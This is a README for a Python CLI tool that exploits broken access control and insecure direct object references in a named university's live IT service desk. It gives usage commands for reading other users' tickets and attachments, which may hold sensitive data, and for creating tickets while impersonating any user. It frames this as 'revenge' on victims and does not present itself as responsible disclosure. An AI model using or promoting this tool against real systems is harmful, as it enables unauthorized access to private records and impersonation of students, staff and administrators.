# Tel-U Service Desk Breacher

If you ever tired of being student, feeling burnout, lack of motivations, or depressed during study, wouldn't it be better if you take a revenge to have some fun? or shall we make PuTI a little bit busy tonight?

![](/img/cover.jpeg)

**The Context:**
There are several active bugs found on [PuTI Service Desk](https://it-servicedesk.telkomuniversity.ac.id/home) service and this tool was developed by exploiting Broken Access Control, Parameter Tampering, and Insecure Direct Object References on that site. If the bug fixed, this repo would be archived.

## Overview

A CLI App to satisfy your frustation that can be used for viewing ticket belonging to another users or creating a new ticket pretending as another users. It's not just a ticket, sometimes user could add sensitive data or attachments in it, that's why it might satisfy your frustation 😈. 

**Key Features:**
- Automated SSO authentication with Chrome via Selenium
- Session persistence in `config.json`
- Breach ticket list and its detail from another user
- Breach attachments from another user's ticket
- Send reply to hijack another user's ticket which didn't belong to you (*todo*)
- Create a new ticket as another user account

As long as you know the target username, you can use this tool for viewing helpdesk ticket belonging to another user or creating ticket as another user. "User" here don't only mean students, but also lecturers, staff, rector, or admin.

![](/img/service-desk.png)

**System Requirements:**

- Python 3.7+
- Chrome
- Works perfectly on Linux

## Installation

1. Extract the project:
```bash
cd Telyu-ServiceDesk-Breacher
```

2. Create virtual environment (recommended):
```bash
python3 -m venv venv
source venv/bin/activate
```

3. Install dependencies:
```bash
pip3 install -r requirements.txt
```

4. Make CLI executable:
```bash
chmod +x cli.py
```

## How to Use

The tool needs Auth Bearer Token and target SSO username in order to work perfectly. If one of them missing, you can't use this tool. To get those info:

1. **Auth Bearer token:** execute `./cli.py login` and complete the login sequence using your Microsoft Student account
2. **Victim username:** You can get this info either from typing the victim name on Ms. Teams or Ms. Outlook.

### 1. Login (First Time)

You must login with your Microsoft SSO Student first to get Auth Token.
```bash
./cli.py login
```

**What happens:**
1. Browser opens automatically
2. Navigate to SATU SSO page and then Login with your Microsoft Account
3. **You** complete the login:
   - Enter Tel-U email
   - Enter password
   - Complete Microsoft OTP
   - Wait for dashboard to load
4. Script automatically extracts bearer token
5. Browser closes
6. Session saved to `config.json`

You can also try the manual version assuming that you already have the Bearer Token from browser local storage:

```bash
./cli.py login --manual
```

### 2. View All Tickets belonging to Other Users

![](/img/overview.png)

```bash
./cli.py tickets --username {sso_username}
```

Replace `sso_username` to your target victim username. Or if you want more detailed output:

```bash
./cli.py tickets --username {sso_username} --format detail
```

**What it does:**
- Fetches all ticket list from a given username
- Sorts by creation time (newest first)
- Shows status label for each ticket

#### 2.2. View ticket detail based on Ticket ID

Get detailed information for a specific ticket assuming if u know the ticket ID.

```bash
./cli.py ticket --id {ticket_id}
```

```bash
./cli.py ticket --id {ticket_id} --format detail
```

#### 2.3. Filter by Specific Status

If you only want tickets with a specific status:

```bash
./cli.py tickets --username {sso_username} --status {status_name}
```

**Available Statuses:**


| status_name    | Code | Description              |
|---------------|------|--------------------------|
| new           | 1    | New ticket               |
| assigned      | 2    | Assigned ticket          |
| in-progress   | 3    | In progress ticket       |
| resolve       | 4    | Resolved ticket          |
| closed        | 5    | Closed ticket            |
| on-hold       | 6    | On hold ticket           |
| confirmation  | 8    | Confirmation ticket      |

**Options:**
- `--username`: Tel-U SSO username to query (required)
- `--status`: Ticket status filter (optional, fetches all if omitted)
- `--page`: Page number (only used with --status)
- `--format`: Output format (`list`, `detail`, or `json`)

**Examples:**
```bash
./cli.py tickets --username king.wzrd --status new
./cli.py tickets --username king.wzrd --status in-progress --page 2
./cli.py tickets --username king.wzrd --status closed --format detail
```

**Output Formats:**
- `list`: Summary view with ticket IDs, status, and short description (default)
- `detail`: Full ticket details including tasks, assignees, attachments
- `json`: Raw JSON response

## 3. Create New Ticket as Another User

The `create-ticket` command allows you to create a new service desk ticket as any specified user.

```bash
./cli.py create-ticket --username {sso_username} --description "{message}"
```

- `--username`: Target SSO username. Specify which user the ticket will be created as
- `--description`: The ticket description/message

Usage Example:

```bash
./cli.py create-ticket --username victim.user --description "Hi there, im hacker. I use your account to create this ticket."
```

Or you can use interactive mode:

```bash
./cli.py create-ticket
```

You'll be prompted for Target username and Ticket description

### 3.1 Multi-line Description

For longer descriptions, use quotes and newlines:

```bash
./cli.py create-ticket \
  --username victim.user \
  --description "
Issue: Email access problem
Details: After resetting password, still cannot login
Attempted solutions: Cleared browser cache, tried different browsers
Request: Please reset email account
"
```

## Configuration

### config.json

After successful login, session data is stored in `config.json`:
```json
{
  "access_token": "eyJ0eXAiOiJKV1Q...",
  "headers": {
    "Authorization": "Bearer eyJ0eXAiOiJKV1Q..."
  },
  "cookies": { ... },
  "extracted_at": "2026-03-17T07:00:00",
  "expires_estimate": "2026-03-18T07:00:00"
}
```

**Session expiry:** Tokens typically last 24 hours. Re-run `./cli.py login` when expired.

## Output Examples

### List Format (All Tickets)

```
================================================================================
Total: 15 ticket(s)
================================================================================

#24567     [NEW] New                      High      
           2026-03-18 14:30:00
           Request for new VPN access for remote work

#24556     [IN-PROGRESS] In Progress      Medium    
           2026-03-18 10:15:00
           Software installation request - Microsoft Office

#24340     [CLOSED] Close                 Medium    
           2025-11-04 23:05:47
           Dear IT Service Desk PuTI, saya memerlukan bantuan untuk reset password SSO...

Total: 15 tickets across all statuses
```

### Detail Format
```
================================================================================
Ticket #24340
================================================================================

📋 Basic Info:
  Status       : Close (closed)
  Priority     : Medium
  Classification: Minor
  Purpose      : Information
  Service      : Informasi → Informasi

👤 User Info:
  Name         : VICTIM USER
  Username     : victim_user
  Tel-U ID     : 1302210127
  Email        : victim_user@student.telkomuniversity.ac.id
  Position     : STUDENT

📅 Dates:
  Created      : 2025-11-04 23:05:47
  Updated      : 2026-03-17 19:41:31
  Closed       : 2025-11-19 11:11:37
  SLA          : 72 hours

📝 Description:
  Dear IT Service Desk PuTI, saya memerlukan bantuan untuk reset password SSO ..

📎 Attachment:
  https://fileserver.telkomuniversity.ac.id/...

⭐ Rating:
  Score        : 1/5
  Feedback     : overall good, but would be better...

📋 Tasks (3):
  1. Permintaan reset password SSO oleh username victim_user..
     Created: 2025-11-05 08:33:16 by admin_puti1
     Assignees: 2 (2 done)

🏷️  Keywords:
  reset password sso

👥 Assignees:
  admin_puti1, admin_puti2, admin_puti3
```

## Project Structure

```
Telyu-ServiceDesk-Breacher/
├── cli.py                    # CLI entry point
├── telyu_cli/                # Source code package
│   ├── api.py                # Service Desk API wrapper
│   ├── auth.py               # Authentication & token management
│   ├── formatter.py          # Output formatting utilities
│   └── browser_login.py      # Automated browser login
├── img/                      # Images
├── config.json               # Session data (created after login)
├── config.json.example       # Example configuration
├── requirements.txt          # Python dependencies
├── setup.sh                  # Quick setup script
└── README.md                 # This file
```